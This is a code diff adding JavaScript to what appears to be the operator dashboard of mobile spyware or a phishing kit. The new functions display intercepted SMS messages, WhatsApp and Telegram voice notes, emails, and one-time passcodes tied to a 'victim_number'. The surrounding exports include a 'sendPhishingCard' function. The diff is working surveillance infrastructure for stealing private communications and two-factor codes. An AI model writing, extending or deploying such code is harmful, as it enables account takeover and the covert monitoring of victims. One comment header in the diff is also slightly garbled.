@@ -1533,8 +1533,231 @@ loadDevices();
 setInterval(loadDevices, 30000);
 
 // ═══════════════════════════════════════════
-// Window exports
+// Window exports══════════════════════════════════════════
 // ═══════════════════════════════════════════
+// 🔐 Open Live Messages / Voices / OTP / Emails
+// ═══════════════════════════════════════════
+// ─── Live Messages ───
+function openLiveMessages() {
+    const el = document.getElementById('liveMsgsOverlay');
+    if (el) el.style.display = 'block';
+    renderLiveMsgs();
+}
+function closeLiveMessages() {
+    const el = document.getElementById('liveMsgsOverlay');
+    if (el) el.style.display = 'none';
+}
+function clearLiveMsgs() {
+    if (!confirm('مسح الرسائل؟')) return;
+    liveMsgs = [];
+    const c = document.getElementById('liveMsgsCount');
+    if (c) c.textContent = '0';
+    renderLiveMsgs();
+}
+function filterLiveMsgs(type) {
+    liveMsgsFilter = type;
+    const setBg = (id, active) => {
+        const el = document.getElementById(id);
+        if (el) el.style.background = active ? '#ff0066' : '#333';
+    };
+    setBg('filterAll', type === 'all');
+    setBg('filterIn', type === 'in');
+    setBg('filterOut', type === 'out');
+    renderLiveMsgs();
+}
+function addLiveMsg(msg) {
+    liveMsgs.unshift(msg);
+    if (liveMsgs.length > 500) liveMsgs = liveMsgs.slice(0, 500);
+    const c = document.getElementById('liveMsgsCount');
+    if (c) c.textContent = liveMsgs.length;
+    if (document.getElementById('liveMsgsOverlay')?.style.display === 'block') renderLiveMsgs();
+}
+function renderLiveMsgs() {
+    const list = document.getElementById('liveMsgsList');
+    if (!list) return;
+    let filtered = liveMsgs;
+    if (liveMsgsFilter === 'in') filtered = liveMsgs.filter(m => m.type == 1);
+    if (liveMsgsFilter === 'out') filtered = liveMsgs.filter(m => m.type == 2);
+    if (filtered.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>';
+        return;
+    }
+    list.innerHTML = '';
+    filtered.forEach((msg) => {
+        const realIdx = liveMsgs.indexOf(msg);
+        const isIncoming = msg.type == 1;
+        const displayName = findContactName(msg.address) || msg.address || 'غير معروف';
+        const div = document.createElement('div');
+        div.style.cssText = `display:flex;${isIncoming ? 'justify-content:flex-start;' : 'justify-content:flex-end;'}`;
+        div.innerHTML = `<div style="max-width:70%;background:${isIncoming ? '#1e2a2a' : '#2a1a20'};border:1px solid ${isIncoming ? '#25D366' : '#ff0066'};padding:12px 15px;border-radius:15px;"><div style="color:${isIncoming ? '#25D366' : '#ff0066'};font-size:11px;font-weight:bold;margin-bottom:5px;">${isIncoming ? '📥' : '📤'} — ${displayName}</div><div style="color:#fff;font-size:14px;line-height:1.5;">${msg.body || ''}</div><div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;gap:10px;"><span style="color:#888;font-size:11px;">${formatDate(msg.date)}</span><button onclick="deleteLiveMsg(${realIdx})" style="background:none;border:none;color:#ff3300;cursor:pointer;font-size:14px;">🗑️</button></div></div>`;
+        list.appendChild(div);
+    });
+}
+function deleteLiveMsg(idx) {
+    if (!confirm('حذف؟')) return;
+    liveMsgs.splice(idx, 1);
+    const c = document.getElementById('liveMsgsCount');
+    if (c) c.textContent = liveMsgs.length;
+    renderLiveMsgs();
+}
+
+// ─── Live Voices ───
+function openLiveVoices() {
+    const el = document.getElementById('liveVoicesOverlay');
+    if (el) el.style.display = 'block';
+    renderLiveVoices();
+}
+function closeLiveVoices() {
+    const el = document.getElementById('liveVoicesOverlay');
+    if (el) el.style.display = 'none';
+}
+function clearLiveVoices() {
+    if (!confirm('مسح الأصوات؟')) return;
+    liveVoices = [];
+    const c = document.getElementById('liveVoicesCount');
+    if (c) c.textContent = '0';
+    renderLiveVoices();
+}
+function addLiveVoice(voice) {
+    liveVoices.unshift(voice);
+    if (liveVoices.length > 200) liveVoices = liveVoices.slice(0, 200);
+    const c = document.getElementById('liveVoicesCount');
+    if (c) c.textContent = liveVoices.length;
+    if (document.getElementById('liveVoicesOverlay')?.style.display === 'block') renderLiveVoices();
+}
+function renderLiveVoices() {
+    const list = document.getElementById('liveVoicesList');
+    if (!list) return;
+    if (liveVoices.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد صوتيات</p>';
+        return;
+    }
+    list.innerHTML = '';
+    liveVoices.forEach((voice, idx) => {
+        const srcLabels = { whatsapp_voice: '💬 واتساب', telegram_voice: '✈️ تيليجرام', unknown: '🎤' };
+        const dirLabel = voice.direction === 'sent' ? '📤' : voice.direction === 'received' ? '📥' : '🎤';
+        const div = document.createElement('div');
+        div.style.cssText = 'background:#0a1a1a;border:2px solid #00ffcc;padding:15px;border-radius:12px;';
+        div.innerHTML = `<div style="color:#00ffcc;font-size:13px;font-weight:bold;margin-bottom:8px;">${dirLabel} — ${srcLabels[voice.source] || '🎤'}</div><div style="color:#ccc;font-size:13px;margin-bottom:8px;">📅 ${formatDate(voice.timestamp)}</div><div style="color:#888;font-size:11px;margin-bottom:8px;">${voice.file_name || ''} (${((voice.file_size||0) / 1024).toFixed(1)} KB)</div><audio controls style="width:100%;margin-bottom:8px;" preload="none"><source src="data:audio/ogg;base64,${voice.file_data}" type="audio/ogg"><source src="data:audio/mp4;base64,${voice.file_data}" type="audio/mp4"></audio><div style="display:flex;gap:8px;"><button onclick="downloadLiveVoice(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️</button><button onclick="deleteLiveVoice(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️</button></div>`;
+        list.appendChild(div);
+    });
+}
+function downloadLiveVoice(idx) {
+    const v = liveVoices[idx];
+    if (!v) return;
+    let mime = 'audio/ogg';
+    if (v.file_name) {
+        const n = v.file_name.toLowerCase();
+        if (n.endsWith('.opus') || n.endsWith('.ogg')) mime = 'audio/ogg';
+        else if (n.endsWith('.m4a')) mime = 'audio/mp4';
+        else if (n.endsWith('.mp3')) mime = 'audio/mpeg';
+    }
+    const a = document.createElement('a');
+    a.href = `data:${mime};base64,${v.file_data}`;
+    a.download = v.file_name || 'voice.opus';
+    document.body.appendChild(a); a.click(); a.remove();
+}
+function deleteLiveVoice(idx) {
+    if (!confirm('حذف؟')) return;
+    liveVoices.splice(idx, 1);
+    const c = document.getElementById('liveVoicesCount');
+    if (c) c.textContent = liveVoices.length;
+    renderLiveVoices();
+}
+
+// ─── Live OTP ───
+function openLiveOtp() {
+    const el = document.getElementById('liveOtpOverlay');
+    if (el) el.style.display = 'block';
+    renderLiveOtp();
+}
+function closeLiveOtp() {
+    const el = document.getElementById('liveOtpOverlay');
+    if (el) el.style.display = 'none';
+}
+function clearLiveOtp() {
+    if (!confirm('مسح الأكواد؟')) return;
+    liveOtps = [];
+    const c = document.getElementById('liveOtpCount');
+    if (c) c.textContent = '0';
+    renderLiveOtp();
+}
+function addLiveOtp(otp) {
+    liveOtps.unshift(otp);
+    if (liveOtps.length > 200) liveOtps = liveOtps.slice(0, 200);
+    const c = document.getElementById('liveOtpCount');
+    if (c) c.textContent = liveOtps.length;
+    if (document.getElementById('liveOtpOverlay')?.style.display === 'block') renderLiveOtp();
+}
+function renderLiveOtp() {
+    const list = document.getElementById('liveOtpList');
+    if (!list) return;
+    if (liveOtps.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد</p>';
+        return;
+    }
+    list.innerHTML = '';
+    liveOtps.forEach((otp, idx) => {
+        const div = document.createElement('div');
+        div.style.cssText = 'background:#1a1a00;border:2px solid #ffcc00;padding:20px;border-radius:12px;';
+        div.innerHTML = `<div style="color:#ffcc00;font-size:12px;font-weight:bold;margin-bottom:8px;">${otp.app_name || 'OTP'} — ${formatDate(otp.timestamp)}</div><div style="color:#fff;font-size:32px;font-weight:bold;letter-spacing:5px;margin:10px 0;">${otp.code || '—'}</div><div style="color:#ccc;font-size:13px;margin-bottom:5px;">📱 ${otp.victim_number || 'غير معروف'}</div><div style="color:#aaa;font-size:12px;margin-bottom:5px;">المرسل: ${otp.sender || '—'}</div><div style="color:#888;font-size:11px;word-break:break-all;">${otp.message || ''}</div><button onclick="deleteLiveOtp(${idx})" style="margin-top:10px;background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>`;
+        list.appendChild(div);
+    });
+}
+function deleteLiveOtp(idx) {
+    if (!confirm('حذف؟')) return;
+    liveOtps.splice(idx, 1);
+    const c = document.getElementById('liveOtpCount');
+    if (c) c.textContent = liveOtps.length;
+    renderLiveOtp();
+}
+
+// ─── Live Emails ───
+function openLiveEmails() {
+    const el = document.getElementById('liveEmailsOverlay');
+    if (el) el.style.display = 'block';
+    renderLiveEmails();
+}
+function closeLiveEmails() {
+    const el = document.getElementById('liveEmailsOverlay');
+    if (el) el.style.display = 'none';
+}
+function clearLiveEmails() {
+    if (!confirm('مسح البريد؟')) return;
+    liveEmails = [];
+    const c = document.getElementById('liveEmailsCount');
+    if (c) c.textContent = '0';
+    renderLiveEmails();
+}
+function addLiveEmail(email) {
+    liveEmails.unshift(email);
+    if (liveEmails.length > 200) liveEmails = liveEmails.slice(0, 200);
+    const c = document.getElementById('liveEmailsCount');
+    if (c) c.textContent = liveEmails.length;
+    if (document.getElementById('liveEmailsOverlay')?.style.display === 'block') renderLiveEmails();
+}
+function renderLiveEmails() {
+    const list = document.getElementById('liveEmailsList');
+    if (!list) return;
+    if (liveEmails.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>';
+        return;
+    }
+    list.innerHTML = '';
+    liveEmails.forEach((email, idx) => {
+        const div = document.createElement('div');
+        div.style.cssText = 'background:#1a1a2e;border:2px solid #00aaff;padding:15px;border-radius:12px;';
+        div.innerHTML = `<div style="color:#00aaff;font-size:13px;font-weight:bold;margin-bottom:8px;">📧 ${email.app_name || 'Email'}</div><div style="color:#ccc;font-size:13px;margin-bottom:5px;">👤 <b>${email.sender || 'غير معروف'}</b></div><div style="color:#fff;font-size:14px;margin-bottom:5px;font-weight:bold;">${email.subject || ''}</div><div style="color:#888;font-size:12px;margin-bottom:8px;">${email.snippet || ''}</div><div style="color:#aaa;font-size:11px;margin-bottom:8px;">📅 ${formatDate(email.timestamp)}</div>${email.image_data ? `<img src="data:image/jpeg;base64,${email.image_data}" style="max-width:200px;border-radius:5px;margin-bottom:8px;cursor:pointer;" onclick="window.open(this.src)">` : ''}<button onclick="deleteLiveEmail(${idx})" style="background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>`;
+        list.appendChild(div);
+    });
+}
+function deleteLiveEmail(idx) {
+    if (!confirm('حذف؟')) return;
+    liveEmails.splice(idx, 1);
+    const c = document.getElementById('liveEmailsCount');
+    if (c) c.textContent = liveEmails.length;
+    renderLiveEmails();
+        }
 window.logout = logout;
 window.openAdvancedMenu = openAdvancedMenu;
 window.sendPhishingCard = sendPhishingCard;
